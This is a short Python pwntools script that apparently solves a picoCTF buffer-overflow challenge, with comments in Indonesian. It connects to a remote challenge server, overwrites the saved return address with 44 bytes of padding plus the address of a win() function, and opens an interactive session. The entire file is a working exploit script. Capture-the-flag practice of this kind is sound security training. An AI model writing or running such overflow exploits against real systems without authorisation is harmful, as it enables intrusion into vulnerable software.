# exploit.py
from pwn import *

elf = ELF('./vuln')

LOCAL = False

if LOCAL:
    io = process('./vuln')
else:
    io = remote('dolphin-cove.picoctf.net', 52241)  # ← isi dari halaman soal

# ===================== ADDRESSES ==================
win_addr = 0x08049276   # alamat win()

# ===================== EXPLOIT ====================
offset = 44             # ✅ hasil cyclic: EIP = 'laaa' at offset 44

payload  = b'A' * offset
payload += p32(win_addr)    # ✅ 32-bit → p32 (4 byte), bukan p64 (8 byte)

# ===================== FIRE =======================
io.sendlineafter(b'key: ', payload)
io.interactive()
